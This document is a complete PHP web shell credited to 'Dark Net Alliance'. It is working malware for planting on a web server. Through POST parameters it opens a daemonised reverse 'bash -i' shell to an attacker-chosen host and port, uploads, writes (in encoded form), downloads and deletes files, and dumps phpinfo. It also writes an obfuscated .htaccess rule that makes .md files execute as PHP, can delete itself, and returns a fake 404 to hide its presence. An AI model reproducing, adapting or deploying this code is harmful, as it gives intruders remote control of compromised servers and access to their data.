<?php
/*
                    O       o O       o O       o
                    | O   o | | O   o | | O   o |
                    | | O | | | | O | | | | O | |
                    | o   O | | o   O | | o   O |
                    o       O o       O o       O
                                { Dark Net Alliance }

                        © 2019, <Cvar1984@BHSec>
              -----------------------------------------
              @author Cvar1984
              @license MIT
              @contributor BHSec

 */

class R2
{
    public static $chunk_size = 1400;
    public static $write_a = null;
    public static $error_a = null;
    public static $daemon = 0;
    public static $shell = 'bash -i'; // bash
    public static $htaccess = 'NqqGlcr+nccyvpngvba%2Sk-uggcq-cuc+.zq';
    /*
     * @param string $host attacker ip/host
     * @param int $port attacker port
     * @return none
     */
    public static function reverse(string $host, int $port)
    {
        if (function_exists('pcntl_fork')) {
            $pid = pcntl_fork();
            if ($pid == -1) {
                exit(1);
            } elseif ($pid) {
                exit(0); // Parent exits
            }
            // Will only succeed if we forked
            if (posix_setsid() == -1) {
                exit(1);
            }
            self::$daemon = 1;
        }
        // Remove any umask we inherited
        umask(0);

        // Open reverse connection
        $sock = fsockopen($host, $port, $errno, $errstr, 30);
        if (!$sock) {
            exit(1);
        }

        // Spawn shell process
        $descriptorspec = array(
            0 => array('pipe', 'r'), // stdin
            1 => array('pipe', 'w'), // stdout
            2 => array('pipe', 'w') // stderr
        );

        $process = proc_open(self::$shell, $descriptorspec, $pipes);

        if (!is_resource($process)) {
            exit(1);
        }
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);
        while (1) {
            // Check for end of TCP connection
            if (feof($sock)) {
                break;
            }
            // Check for end of STDOUT
            if (feof($pipes[1])) {
                break;
            }

            $read_a = array($sock, $pipes[1], $pipes[2]);
            $num_changed_sockets = stream_select(
                $read_a,
                self::$write_a,
                self::$error_a,
                null
            );

            if (in_array($sock, $read_a)) {
                $input = fread($sock, self::$chunk_size);
                fwrite($pipes[0], $input);
            }

            if (in_array($pipes[1], $read_a)) {
                $input = fread($pipes[1], self::$chunk_size);
                fwrite($sock, $input);
            }

            if (in_array($pipes[2], $read_a)) {
                $input = fread($pipes[2], self::$chunk_size);
                fwrite($sock, $input);
            }
        }

        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
    /*
     * @param array $file from $_FILES
     * @return bool
     */
    public static function upload(array $file)
    {
        return move_uploaded_file($file['tmp_name'], $file['name']);
    }
    /*
     * @param none
     * @return bool
     */
    public static function remove()
    {
        return unlink($_SERVER['SCRIPT_FILENAME']);
    }
    /*
     * @param string $name output file name
     * @param string $file mix encoded source
     * @return bool
     */
    public static function write(string $name, string $file)
    {
        return file_put_contents($name, str_rot13(urldecode($file)));
    }
    /*
     * @param none
     * @return bool
     */
    public static function htaccess()
    {
        return self::write('.htaccess', self::$htaccess);
    }
    /*
     * @param string $class class to be reflected
     * @return json
     */
    public static function help(string $class)
    {
        $ref = new ReflectionClass($class);
        return json_encode(
            [
                'method' => $ref->getMethods(),
                'property' => $ref->getStaticProperties()
            ],
            JSON_PRETTY_PRINT
        );
    }
    /*
     * @param string $class class to be reflected
     * @param string $property property to be reflected
     * @param string $value value to be replaced
     * @return none
     */
    public static function debug(string $class, string $property, string $value)
    {
        $ref = new ReflectionClass($class);
        $ref->setStaticPropertyValue($property, $value);
        return;
    }
    /*
     * @param none
     * @return json
     */
    public static function info()
    {
        ob_start();
        phpinfo();
        $s = ob_get_clean();
        $s = strip_tags($s, '<h2><th><td>');
        $s = preg_replace('/<th[^>]*>([^<]+)<\/th>/', '<info>\1</info>', $s);
        $s = preg_replace('/<td[^>]*>([^<]+)<\/td>/', '<info>\1</info>', $s);
        $t = preg_split(
            '/(<h2[^>]*>[^<]+<\/h2>)/',
            $s,
            -1,
            PREG_SPLIT_DELIM_CAPTURE
        );
        $r = array();
        $count = count($t);
        $p1 = '<info>([^<]+)<\/info>';
        $p2 = '/' . $p1 . '\s*' . $p1 . '\s*' . $p1 . '/';
        $p3 = '/' . $p1 . '\s*' . $p1 . '/';
        for ($i = 1; $i < $count; $i++) {
            if (preg_match('/<h2[^>]*>([^<]+)<\/h2>/', $t[$i], $matchs)) {
                $name = trim($matchs[1]);
                $vals = explode("\n", $t[$i + 1]);
                foreach ($vals as $val) {
                    if (preg_match($p2, $val, $matchs)) {
                        // 3cols
                        $r[$name][trim($matchs[1])] = array(
                            trim($matchs[2]),
                            trim($matchs[3])
                        );
                    } elseif (preg_match($p3, $val, $matchs)) {
                        // 2cols
                        $r[$name][trim($matchs[1])] = trim($matchs[2]);
                    }
                }
            }
        }
        return json_encode($r, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    }
    /*
     * @param string $file path to filename
     * @return mixed
     */
    public static function downLoad(string $file)
    {
        header("Content-Disposition: attachment; filename=" . basename($file));
        header("Content-Length: " . filesize($file));
        header("Content-Type: application/octet-stream;");
        readfile($file);
    }
    /*
     * @param string $ls path to listed
     * @return json
     */
    public static function ls($dir)
    {
        return json_encode(
            scandir(getcwd() . DIRECTORY_SEPARATOR . $dir),
            JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES
        );
    }
    /*
     * @param string $file file path to be removed
     * @return bool
     */
    public static function rm(string $file)
    {
        return unlink(getcwd() . DIRECTORY_SEPARATOR . $file);
    }
}
set_time_limit(0);
//error_reporting(0);
error_log(0);
if (isset($_POST['debug'])) {
    echo R2::debug($_POST['debug'], $_POST['property'], $_POST['value']);
}
if (isset($_POST['host']) && isset($_POST['port'])) {
    R2::reverse($_POST['host'], $_POST['port']);
} elseif (isset($_FILES['upload'])) {
    echo R2::upload($_FILES['upload']);
} elseif (isset($_POST['remove'])) {
    echo R2::remove();
} elseif (isset($_POST['htaccess'])) {
    echo R2::htaccess();
} elseif (isset($_POST['name']) && isset($_POST['write'])) {
    echo R2::write($_POST['name'], $_POST['write']);
} elseif (isset($_POST['help'])) {
    echo R2::help($_POST['help']);
} elseif (isset($_POST['info'])) {
    echo R2::info();
} elseif (isset($_POST['download'])) {
    R2::downLoad($_POST['download']);
} elseif (isset($_POST['ls'])) {
    echo R2::ls($_POST['ls']);
} elseif (isset($_POST['rm'])) {
    echo R2::rm($_POST['rm']);
} else {
    header('HTTP/1.0 404 Not Found', true, 404);
    exit(404);
}
